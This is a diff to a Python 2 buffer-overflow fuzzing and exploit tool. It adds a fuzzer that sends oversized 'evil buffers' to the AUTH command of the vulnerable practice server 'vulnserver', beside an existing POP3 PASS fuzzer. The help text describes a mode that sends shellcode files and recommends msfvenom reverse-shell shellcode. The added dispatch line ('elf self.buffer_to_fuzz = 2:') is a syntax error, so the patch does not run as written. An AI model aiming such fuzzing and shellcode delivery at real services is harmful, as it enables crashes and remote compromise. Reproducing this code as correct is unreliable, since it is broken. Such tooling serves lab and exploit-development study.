@@ -43,6 +43,8 @@ class FuzzBucket(object):
 	def fuzz_it(self, evil_buffer):
 		if self.buffer_to_fuzz == 1:
 			self.pop3_password_buffer(evil_buffer)
+		elf self.buffer_to_fuzz = 2:
+			self.test_vulnserv_buffer(evil_buffer)
 
 	def pop3_password_buffer(self, evil_buffer):
 		# sending an evil buffer to the POP3 password field
@@ -52,6 +54,13 @@ class FuzzBucket(object):
 		print "Fuzzing PASS with {} bytes".format(str(len(evil_buffer)))
 
 		self.socket_conn.send('PASS ' + evil_buffer + '\r\n')
+		result = self.socket_conn.recv(1024)
+
+	def test_vulnserv_buffer(self, evil_buffer):
+		# sending an evil buffer to the vulnserver process
+		print "Fuzzing AUTH with {} bytes".format(str(len(evil_buffer)))
+
+		self.socket_conn.send('AUTH ' + evil_buffer + '\r\n')
 		result = self.socket_conn.recv(1024)
 
 class FuzzLib(object):
@@ -212,7 +221,7 @@ def check_file_exists(file):
 		return False
 
 def list_fuzzers():
-	buffers_to_fuzz = {1: 'pop3_password_buffer'}
+	buffers_to_fuzz = {1 : 'pop3_password_buffer', 2 : 'test_vulnserv_buffer'}
 	string = "Buffers available to fuzz: "
 	for key, value in buffers_to_fuzz.iteritems():
 		string += "{}) {} ".format(str(key), value)
@@ -288,7 +297,7 @@ def main():
 	parser.add_argument('--send-exploit', dest='send_exploit', action='store_true',
 			help='''test exploit and send shellcode. MUST use -l argument, -a argument and
 			-x argument.''')
-	parser.add_argument('-x', dest='shellcode', type=check_file_exists, default='None', 
+	parser.add_argument('-x', dest='shellcode', type=check_file_exists, 
 			metavar='<shellcode file>', help='''file containing shellcode string to use. Use a tool 
 			like msfvenom to automate the creation of reverse shell shellcode.''')
 
